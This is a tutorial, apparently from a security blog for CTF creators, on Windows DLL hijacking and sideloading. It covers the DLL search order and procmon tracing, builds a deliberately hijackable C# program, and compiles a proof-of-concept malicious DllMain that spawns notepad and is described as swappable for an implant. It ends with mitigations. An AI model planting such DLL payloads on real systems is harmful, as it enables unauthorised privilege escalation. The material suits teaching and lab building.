# Windows Local Privilege Escalation - DLL Hijacking for CTF Creators




# DLL Hijacking

A dynamically compiled Win32 executable may use functions exported by built-in or third-party Dynamic Link Libraries (DLLs). There are two common ways to achieve this:

- **Import Address Table (IAT)**: When a program is compiled, an import address table is written into the headers of the Portable Executable (PE). The IAT keeps track of the functions that need to be imported from a DLL. As a result, every time the program runs, the linker knows which libraries to load and which functions to call.

- **Windows APIs**: Libraries can be imported at runtime using functions such as `LoadLibrary()` or `LoadLibraryEx()` from the Windows API.

# DLL Hijacking vs Reflective DLL Hijacking vs DLL Sideloading

This article does not cover every aspect of DLL hijacking. However, at a high level, these are the main differences:

- **DLL Hijacking**: Also known as `PATH DLL Hijacking`, this occurs when a DLL file is written to disk and the `%PATH%` environment variable is exploited.

- **Reflective DLL Hijacking**: In this method, a DLL file is not written to disk. Instead, the DLL is loaded directly into memory and executed from there.

- **DLL Sideloading**: This happens when the permissions of an application's directory are not properly configured, often limiting the impact to that specific application.

# Is PATH DLL Hijacking a Vulnerability?

According to Microsoft, they won’t address DLL hijacking scenarios involving `%PATH%` directories as a vulnerability. As we can see in this [article](https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/).

## DLL Search Order

Understanding how Windows performs the [Dynamic-Link Library (DLL) Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) is crucial. According to the official documentation, the process is as follows:

> Desktop applications can control the location from which a DLL is loaded by specifying a full path, using [DLL redirection](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection), or by using a [manifest](https://docs.microsoft.com/en-us/windows/desktop/SbsCs/manifests). If none of these methods are used, the system searches for the DLL at load time as described in this section.
>
> Before the system searches for a DLL, it checks the following:
>
> - If a DLL with the same module name is already loaded in memory, the system uses the loaded DLL, regardless of its directory. The system does not search for the DLL.
> - If the DLL is on the list of known DLLs for the version of Windows on which the application is running, the system uses its copy of the known DLL (and the known DLL's dependent DLLs, if any). The system does not search for the DLL. For a list of known DLLs on the current system, see the following registry key: **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.

Based on this information, Windows checks if a DLL is loaded in primary memory **before** searching for it. If it isn't, it checks the '**KnownDLLs**' list under the registry entry '**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**'. Primary memory, however, cannot be managed at an integrity level that is not a system-integrity level.

{{< admonition warning >}}
The system's DLL search order is determined by whether or not Safe DLL Search Mode is enabled. In Safe DLL Search Mode, the user's current directory is placed later in the search order.
{{< /admonition >}}

Safe DLL Search Mode is enabled by default. To disable this feature, create the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode` registry value and set it to 0.

According to the official documentation, the search order is as follows:

> If **SafeDllSearchMode** is enabled, the search order is:
>
> 1. The directory from which the application loaded.
> 2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.
> 3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
> 4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
> 5. The current directory.
> 6. The directories listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
>
> If **SafeDllSearchMode** is disabled, the search order is:
>
> 1. The directory from which the application loaded.
> 2. The current directory.
> 3. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.
> 4. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
> 5. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
> 6. The directories listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Here is a diagram of how the DLL search order looks when **SafeDllSearchMode** is enabled:

{{< image src="/images/posts/dll-search-order.png" caption="DLL Search Order with SafeDllSearchMode enabled" src_s="/images/posts/dll-search-order.png" src_l="/images/posts/dll-search-order.png" >}}

The potential issues are marked: if an attacker can **write** to the application folder, they can perform `DLL Sideloading`, or if they can **write** to the directories listed in the `%PATH%` environment variable, they can perform `PATH DLL Hijacking`.

# Privilege Escalation via DLL Hijacking Sideloading & PATH DLL Hijacking

The problem with DLL Hijacking is in the fact that if a DLL can be loaded from another directory (PATH DLL Hijacking) or simply replaced in the applications folder (DLL Sideloading), then we as attackers can create our own DLL payload. If a service or an application is vulnerable to `DLL Hijacking` we can escalate our privileges as long as the service or application is executed with `higher privileges` or with a `higher integrity level`.

DLL Hijacking is especially effective when it is implemented in services that are running as the LocalSystem (`NT AUTHORITY\SYSTEM`) service account since it will allow us to escalate our privileges to `System-integrity level`.

### Configuration & Privilege Escalation

We're gonna create an empty `Empty Project (.NET Framework)` for C#:

{{< image src="/images/posts/vs-dll-hijack.png" caption="VS 1 " src_s="/images/posts/vs-dll-hijack.png" src_l="/images/posts/vs-dll-hijack.png" >}}

Then we're gonna set the directory in which we will save our project:

{{< image src="/images/posts/vs-dll-hijack-2.png" caption="VS 2 " src_s="/images/posts/vs-dll-hijack-2.png" src_l="/images/posts/vs-dll-hijack-2.png" >}}

Now we'll need to add a new item (Code File):

{{< image src="/images/posts/vs-dll-hijack-3.png" caption="VS 3 " src_s="/images/posts/vs-dll-hijack-3.png" src_l="/images/posts/vs-dll-hijack-3.png" >}}

We'll name this item as `DLL-Hijack.cs` which it'll be a Code File:

{{< image src="/images/posts/vs-dll-hijack-4.png" caption="VS 4 " src_s="/images/posts/vs-dll-hijack-4.png" src_l="/images/posts/vs-dll-hijack-4.png" >}}

In the `DLL-Hijack.cs` we'll write this DLL hijackable vulnerable code:

```csharp
using System.Runtime.InteropServices;

class dll_hijack
{
    [DllImport("unknown.dll")]
    public static extern void UnknownMethod();
    static void Main(string[] args) => UnknownMethod();
}
```

Next, we'll add a C++ item (Code File) named `unknown.cpp`:

{{< image src="/images/posts/vs-dll-hijack-5.png" caption="Lighthouse " src_s="/images/posts/vs-dll-hijack-5.png" src_l="/images/posts/vs-dll-hijack-5.png" >}}

We'll create a function named `UnknownMethod` with the following code:

```cpp
#include <iostream>
extern "C" __declspec(dllexport)
void UnknownMethod()
{
	std::cout << "Hola Mundo!" << std::endl;
}
```

Then we'll create an `unknown.def` file which defines which function to export:

```def
LIBRARY "Unknown"
EXPORTS
  UnknownMethod
```

The **Solution Explorer** looks like this:

{{< image src="/images/posts/vs-dll-hijack-6.png" caption="Solution Explorer " src_s="/images/posts/vs-dll-hijack-6.png" src_l="/images/posts/vs-dll-hijack-6.png" >}}

Build the solution:

{{< image src="/images/posts/vs-dll-hijack-6.1.png" caption="Solution Explorer " src_s="/images/posts/vs-dll-hijack-6.1.png" src_l="/images/posts/vs-dll-hijack-6.1.png" >}}

Add the details:

{{< image src="/images/posts/vs-dll-hijack-7.png" caption="Solution Explorer " src_s="/images/posts/vs-dll-hijack-7.png" src_l="/images/posts/vs-dll-hijack-7.png" >}}

We're going to create the DLL with the **Developer Command Prompt for VS 2022**:

```powershell
C:\Program Files\Microsoft Visual Studio\2022\Community>cd C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack

C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack>cl.exe /W0 /DUNICODE /D_UNICODE /D_USRDLL /D_WINDLL unknown.cpp unknown.def /MT /link /DLL /OUT:unknown.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31104 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

unknown.cpp
C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.31.31103\include\ostream(770): warning C4530: C++ exception handler used, but unwind semantics are not enabled. Specify /EHsc
unknown.cpp(5): note: see reference to function template instantiation 'std::basic_ostream<char,std::char_traits<char>> &std::operator <<<std::char_traits<char>>(std::basic_ostream<char,std::char_traits<char>> &,const char *)' being compiled
Microsoft (R) Incremental Linker Version 14.31.31104.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:unknown.exe
/DLL
/OUT:unknown.dll
/def:unknown.def
unknown.obj
   Creating library unknown.lib and object unknown.exp
```

Now we have to copy the DLL into the directory of the executable:

```powershell
C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack>copy C:\Users\user\Desktop\dll-hijack\dll-hijack\unknown.dll C:\Users\user\Desktop\dll-hijack\dll-hijack\bin\Release\
        1 file(s) copied.
```

Then we're going to add the following procmon filter to filter the executable:

{{< image src="/images/posts/procmon-dll-hijack-filter.png" caption="Procmon DLL Hijack Filter " src_s="/images/posts/procmon-dll-hijack-filter.png" src_l="/images/posts/procmon-dll-hijack-filter.png" >}}

Now we'll filter the DLL:

{{< image src="/images/posts/procmon-dll-hijack-filter-dll.png" caption="Procmon DLL Hijack " src_s="/images/posts/procmon-dll-hijack-filter-dll.png" src_l="/images/posts/procmon-dll-hijack-filter-dll.png" >}}

Finally, we'll add the `NAME NOT FOUND` string:

{{< image src="/images/posts/procmon-dll-hijack-filter-string.png" caption="Procmon DLL Hijack Filter String " src_s="/images/posts/procmon-dll-hijack-filter-string.png" src_l="/images/posts/procmon-dll-hijack-filter-string.png" >}}

Hit the capture button (Ctrl+E) to start monitoring:

{{< image src="/images/posts/procmon-capture.png" caption="Procmon Capture " src_s="/images/posts/procmon-capture.png" src_l="/images/posts/procmon-capture.png" >}}

Execute the executable:

```powershell
C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack\bin\Release>.\DLL-Hijack.exe
Hola Mundo!
```

In the output we can see the DLL that the DLL file was found:

{{< image src="/images/posts/dll-found.png" caption="DLL Found " src_s="/images/posts/dll-found.png" src_l="/images/posts/dll-found.png" >}}

However, if we delete or rename the DLL file in our directory:

```powershell
C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack\bin\Release>del unknown.dll
```

Then we execute our executable again while this time enabling the **name not found** and the capture button in `procmon`:

```powershell
C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack\bin\Release>.\DLL-Hijack.exe

Unhandled Exception: System.DllNotFoundException: Unable to load DLL 'unknown.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at dll_hijack.UnknownMethod()
   at dll_hijack.Main(String[] args) in C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack\DLl-Hijack.cs:line 7
```

We can already see that the DLL file was not found based on the output above, if we take a look at procmon, we can see the DLL search order:

{{< image src="/images/posts/procmon-dll-hijack-name-not-found.png" caption="Procmon DLL Hijack " src_s="/images/posts/procmon-dll-hijack-name-not-found.png" src_l="/images/posts/procmon-dll-hijack-name-not-found.png" >}}

> Note: The Procmon operations order is from OLD on top and NEW on bottom. We can see this in the **Time of Day** column.

On our Visual Studio project we'll add our evil DLL payload file named `unknown-evil.cpp` which will spawn `notepad.exe`:

```cpp
#include <Windows.h>
#include <tchar.h>
#include <iostream>

// Needs to be DllMain
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // std::cout << "Launching notepad.exe!" << std::endl;

    // char cmd[] = "C:\\Windows\\System32\\cmd.exe";
    LPCWSTR cmd = L"C:\\Windows\\system32\\notepad.exe";
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // WinExec(cmd, SW_SHOW); 
        CreateProcess(
            cmd,
            NULL, NULL, NULL, TRUE, 0, NULL, NULL,
            &si, &pi);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport)
BOOL WINAPI UnknownMethod()
{
    std::cout << "DLL Hijacked!" << std::endl;
    return TRUE;
}
```

We'll compile this code into a DLL and copy the same to the application directory, this technique is known as **DLL Sideloading** since we're writing a DLL in the application's folder and not in the **%PATH%** environment variable:

```powershell
C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack>cl.exe /W0 /DUNICODE /D_UNICODE /D_USRDLL /D_WINDLL unknown-evil.cpp unknown.def /MT /link /DLL /OUT:unknown.dll
Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31104 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

unknown-evil.cpp
C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.31.31103\include\ostream(770): warning C4530: C++ exception handler used, but unwind semantics are not enabled. Specify /EHsc
unknown-evil.cpp(35): note: see reference to function template instantiation 'std::basic_ostream<char,std::char_traits<char>> &std::operator <<<std::char_traits<char>>(std::basic_ostream<char,std::char_traits<char>> &,const char *)' being compiled
Microsoft (R) Incremental Linker Version 14.31.31104.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:unknown-evil.exe
/DLL
/OUT:unknown.dll
/def:unknown.def
unknown-evil.obj
   Creating library unknown.lib and object unknown.exp

C:\Users\user\Desktop\DLL-Hijack\DLL-Hijack>copy C:\Users\user\Desktop\dll-hijack\dll-hijack\unknown.dll C:\Users\user\Desktop\dll-hijack\dll-hijack\bin\Release\
        1 file(s) copied.
```

Let's open a command prompt or a PowerShell console as an **administrator**. When we run the executable the DLL will be loaded and the exported functions will be executed:

```powershell
C:\Users\user\Desktop\Project1\Project1\bin\Release>.\Project1.exe
DLL Hijacked!
```

As we can see the application `notepad.exe` was launched:

{{< image src="/images/posts/dll-hijacked.png" caption="DLL Hijacked " src_s="/images/posts/dll-hijacked.png" src_l="/images/posts/dll-hijacked.png" >}}

Using Process Hacker as **administrator** we can view the access token:

{{< image src="/images/posts/process-hacker-dll-hijack.png" caption="Process Hacker DLL Hijack " src_s="/images/posts/process-hacker-dll-hijack.png" src_l="/images/posts/process-hacker-dll-hijack.png" >}}

Noticed that is running with a high-integrity level since the executable was executed from a high-integrity level console. This created a process tree which by default the child process (notepad.exe) inherits the access token of the parent process (DLL-Hijack.exe).

Now we could also try to write to one of the directories in the **%PATH%** environment variable to implement a **DLL PATH Hijacking** technique. We can replace `notepad.exe` with our `implant` or `payload` to elevate our privileges.

## Defense

DLL hijacking is an exploitation technique used to achieve code execution within the context of an application or service integrity level. To mitigate this risk, it is essential to address vulnerabilities such as misconfigured folder permissions or the abuse of privileged file operations:

- **Misconfigured Folder Permissions**: This issue can arise from the installation of third-party applications. While it may not always occur, system administrators should regularly check and verify the permissions of folders within the system to ensure they are correctly configured.

- **Abuse of Privileged File Operations**: This problem stems from weaknesses in the application's architecture. Developers should review and update the code to prevent such operations on files and folders that can be managed by users.

### Additional Defenses

- **Implement Application Whitelisting**: Use application whitelisting to ensure that only approved applications and DLLs can be executed. This helps prevent unauthorized DLLs from being loaded.

- **Enable Windows Defender Application Control (WDAC)**: WDAC can help control the execution of applications and DLLs, providing an additional layer of security.

- **Regularly Update Software**: Ensure that all software, including third-party applications, is kept up to date with the latest security patches and updates.

- **Use Digital Signatures**: Require that all DLLs and executables be digitally signed. This helps verify the integrity and authenticity of the files before they are loaded.

- **Monitor and Audit System Activity**: Implement monitoring and auditing tools to track system activity and detect any suspicious behavior related to DLL loading and execution.

By implementing these measures, you can enhance your defenses against DLL hijacking and reduce the risk of exploitation.
